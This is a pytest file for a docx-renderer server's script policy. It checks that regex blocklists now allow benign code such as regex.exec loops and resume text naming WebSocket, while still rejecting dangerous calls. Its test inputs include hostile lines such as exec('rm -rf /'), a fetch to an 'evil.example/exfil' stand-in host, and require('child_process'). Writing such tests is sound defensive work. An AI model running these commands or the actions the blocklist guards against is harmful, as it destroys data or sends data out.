"""Tests for the pre-execution script policy patterns (docx-renderer-server.py).

These cover the two false-positive classes found on the 2026-07-29 batch, where
a PriceSenz resume render was rejected twice and the second rejection was a
*valid* program refused over benign code:

  1. method-call false positive -- `\\bexec\\s*\\(` matched `regex.exec(text)`,
     because `\\b` sits in the gap between `.` and the identifier. That loop is
     the idiomatic way to walk repeated regex matches and is exactly what a
     markdown-to-docx program writes to parse `**bold**`, so the rejection was
     structural rather than unlucky.
  2. mention-vs-use false positive -- `\\bWebSocket\\b` matched the bare word
     anywhere, including inside string literals. In these programs the string
     literals are resume text, so a resume naming the technology was rejected as
     a policy violation.

The negative cases matter more than the positive ones here: this file exists to
prove the blocklist still rejects what it is for.
"""
import importlib.util
import pathlib
import re

import pytest

_SERVER = pathlib.Path(__file__).resolve().parent.parent / "docx-renderer-server.py"


def _load():
    spec = importlib.util.spec_from_file_location("docxsrv_policy_undertest", _SERVER)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


m = _load()


def _node_hits(source: str) -> list[str]:
    """Labels of every node policy pattern matching `source`."""
    return [
        label for pattern, label in m.DISALLOWED_CODE_PATTERNS
        if re.search(pattern, source)
    ]


def _scan_node(source: str) -> list[dict]:
    """Run the real file-level node policy over one .mjs entry."""
    return m.validate_node_script_policy(
        [{"path": "render-document.mjs", "content": source}]
    )


# --- 1. method calls must not trip the call patterns -----------------------

#: The exact construct that was rejected on 2026-07-29 (PriceSenz attempt 02).
BOLD_PARSER = """
function splitBold(text) {
  const runs = [];
  const regex = /\\*\\*(.+?)\\*\\*/g;
  let last = 0;
  let m;
  while ((m = regex.exec(text)) !== null) {
    if (m.index > last) runs.push(new TextRun(text.slice(last, m.index)));
    last = regex.lastIndex;
  }
  return runs;
}
"""


def test_regex_exec_loop_is_not_rejected():
    assert _node_hits(BOLD_PARSER) == []
    assert _scan_node(BOLD_PARSER) == []


@pytest.mark.parametrize("source", [
    "const r = obj.exec(cmd);",
    "const r = shell.execFile(bin);",
    "const r = pool.spawn(task);",
    "const r = repo.fork(branch);",
    "const r = sandbox.eval(expr);",
    "const r = client.fetch(url);",
    "const r = registry.import(name);",
])
def test_method_calls_are_not_rejected(source):
    assert _node_hits(source) == []


# --- 2. bare global calls MUST still be rejected ---------------------------

@pytest.mark.parametrize("source,label", [
    ("exec('rm -rf /');", "exec( call"),
    ("execFile('/bin/sh');", "execFile( call"),
    ("spawn('sh', ['-c', 'x']);", "spawn( call"),
    ("fork('./worker.js');", "fork( call"),
    ("eval(userInput);", "eval( call"),
    ("fetch('https://evil.example/exfil');", "fetch( call"),
    ("const mod = await import('node:child_process');", "dynamic import( call"),
    ("const f = new Function('return 1');", "new Function( call"),
    ("process.exit(1);", "process.exit"),
])
def test_bare_dangerous_calls_still_rejected(source, label):
    assert label in _node_hits(source)
    assert _scan_node(source), f"file-level scan let {source!r} through"


@pytest.mark.parametrize("source,label", [
    ("await globalThis.fetch('https://evil.example');", "fetch( call"),
    ("await window.fetch(url);", "fetch( call"),
    ("self.fetch(url);", "fetch( call"),
    ("global.fetch(url);", "fetch( call"),
    ("globalThis.eval(code);", "eval( call"),
    ("globalThis . eval (code);", "eval( call"),
])
def test_globals_via_global_object_still_rejected(source, label):
    """The method-call exclusion must not let a real global through just
    because it is reached as a property of the global object."""
    assert label in _node_hits(source)
    assert _scan_node(source), f"file-level scan let {source!r} through"


def test_exec_still_caught_at_start_of_line_and_after_operators():
    for source in ["exec(x)", "  exec(x)", "if (a) exec(x);", "{exec(x)}", ";exec(x)"]:
        assert "exec( call" in _node_hits(source), source


# --- 3. mention vs use: prose must not trip identifier patterns ------------

@pytest.mark.parametrize("prose", [
    'const t = new TextRun("browser engine over WebSocket");',
    'const t = new TextRun("browser engine over WebSockets");',
    'const t = new TextRun("replaced XMLHttpRequest with fetch API");',
    'const t = new TextRun("WebSocket transport, XMLHttpRequest fallback");',
])
def test_technology_names_in_resume_text_are_not_rejected(prose):
    assert _node_hits(prose) == []


@pytest.mark.parametrize("source,label", [
    ("const s = new WebSocket('wss://evil.example');", "WebSocket construction"),
    ("const x = new XMLHttpRequest();", "XMLHttpRequest construction"),
])
def test_network_construction_still_rejected(source, label):
    assert label in _node_hits(source)
    assert _scan_node(source)


# --- 4. python `exec` must NOT be relaxed ---------------------------------

def test_python_exec_pattern_is_unchanged():
    """`exec` is a Python builtin, so the bare form there is real."""
    hits = [
        label for pattern, label in m.DISALLOWED_PYTHON_PATTERNS
        if re.search(pattern, "exec('import os')")
    ]
    assert "exec( call" in hits


def test_python_policy_still_rejects_exec_in_a_file():
    errors = m.validate_python_script_policy(
        [{"path": "render_document.py", "content": "exec(payload)\n"}]
    )
    assert errors and errors[0]["code"] == "SCRIPT_REJECTED_BY_POLICY"


# --- 5. the import blocklist is what actually closes the exec route -------

def test_child_process_import_still_blocked():
    """The relaxed call pattern is safe only because this stays strict."""
    errors = _scan_node("import { exec } from 'node:child_process';\n")
    assert errors and any("child_process" in e["message"] for e in errors)


def test_require_still_rejected():
    errors = _scan_node("const cp = require('child_process');\n")
    assert errors and any("require()" in e["message"] for e in errors)
